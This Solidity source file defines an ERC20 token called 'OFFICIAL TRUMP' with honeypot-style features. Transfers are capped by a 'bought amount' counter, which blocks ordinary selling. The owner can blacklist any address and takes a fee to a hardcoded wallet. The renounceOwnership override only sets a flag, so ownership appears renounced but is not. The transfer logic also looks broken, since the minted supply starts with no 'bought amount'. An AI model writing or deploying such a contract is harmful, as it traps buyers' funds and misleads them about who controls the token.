// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract OfficialTrump is ERC20, Ownable {
    uint256 public constant TOTAL_SUPPLY = 28600 * 10**18;
    uint256 public constant TRANSACTION_FEE = 5;
    uint256 public constant HOLDER_REWARD_PERCENTAGE = 4;
    uint256 public constant OWNER_FEE_PERCENTAGE = 1;

    address public constant OWNER_ADDRESS = 0x3f9F46a2Aa13341f05F24aAA7602490F64004Bbe;
    mapping(address => bool) private _blacklist;
    mapping(address => bool) private _isHolderMapping;
    mapping(address => uint256) private _boughtAmount;
    bool private _ownershipRenounced = false;
    address[] private _holders;

    event BlacklistUpdated(address indexed user, bool value);
    event OwnershipRenounced();

    constructor() ERC20("OFFICIAL TRUMP", "TRUMP") Ownable(msg.sender) {
        _mint(msg.sender, TOTAL_SUPPLY);
        _holders.push(msg.sender);
        _isHolderMapping[msg.sender] = true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _customTransfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = allowance(sender, msg.sender);
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);
        
        _customTransfer(sender, recipient, amount);
        return true;
    }

    function _customTransfer(address sender, address recipient, uint256 amount) internal {
        require(!_blacklist[sender], "Sender is blacklisted");
        require(!_blacklist[recipient], "Recipient is blacklisted");
        require(amount <= _boughtAmount[sender], "Cannot sell more than bought amount");

        uint256 feeAmount = (amount * TRANSACTION_FEE) / 100;
        uint256 rewardAmount = (amount * HOLDER_REWARD_PERCENTAGE) / 100;
        uint256 ownerFeeAmount = (amount * OWNER_FEE_PERCENTAGE) / 100;
        uint256 transferAmount = amount - feeAmount;

        super._transfer(sender, recipient, transferAmount);
        super._transfer(sender, OWNER_ADDRESS, ownerFeeAmount);
        distributeRewards(sender, rewardAmount);

        _boughtAmount[sender] -= amount;
        _boughtAmount[recipient] += transferAmount;

        if (!_isHolderMapping[recipient] && balanceOf(recipient) > 0) {
            _holders.push(recipient);
            _isHolderMapping[recipient] = true;
        }
    }

    function distributeRewards(address sender, uint256 rewardAmount) private {
        uint256 totalSupplyExcludingBlacklisted;
        uint256 holderCount = _holders.length;

        for (uint256 i = 0; i < holderCount; i++) {
            address holder = _holders[i];
            if (!_blacklist[holder]) {
                totalSupplyExcludingBlacklisted += balanceOf(holder);
            }
        }

        if (totalSupplyExcludingBlacklisted > 0) {
            for (uint256 i = 0; i < holderCount; i++) {
                address holder = _holders[i];
                if (!_blacklist[holder]) {
                    uint256 holderShare = (balanceOf(holder) * rewardAmount) / totalSupplyExcludingBlacklisted;
                    super._transfer(sender, holder, holderShare);
                }
            }
        }
    }

    function addBlacklist(address user) external onlyOwner {
        require(!_ownershipRenounced, "Ownership renounced");
        _blacklist[user] = true;
        emit BlacklistUpdated(user, true);
    }

    function removeBlacklist(address user) external onlyOwner {
        require(!_ownershipRenounced, "Ownership renounced");
        _blacklist[user] = false;
        emit BlacklistUpdated(user, false);
    }

    function renounceOwnership() public override onlyOwner {
        _ownershipRenounced = true;
        emit OwnershipRenounced();
    }
}
